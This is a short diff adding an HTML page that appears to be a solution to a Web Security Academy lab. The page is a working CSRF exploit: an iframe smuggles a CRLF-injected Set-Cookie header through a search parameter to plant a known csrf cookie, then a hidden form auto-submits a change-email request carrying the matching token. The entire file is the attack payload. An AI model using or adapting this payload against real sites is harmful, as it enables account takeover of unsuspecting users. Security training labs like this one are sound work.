@@ -1,0 +1,8 @@
+<iframe src="https://0a7500cc03c8a83980014ed600930061.web-security-academy.net/?search=tes%0d%0aSet-Cookie:%20csrf=asd%3bSameSite=None" frameborder="0"></iframe>
+
+<form class="login-form" name="change-email-form" action="https://0a7500cc03c8a83980014ed600930061.web-security-academy.net/my-account/change-email" method="POST">
+    <input required="" type="email" name="email" hidden value="carlos2@test.net">
+    <input required="" type="hidden" name="csrf" value="asd">
+</form>
+
+<script>document.forms[0].submit()</script>
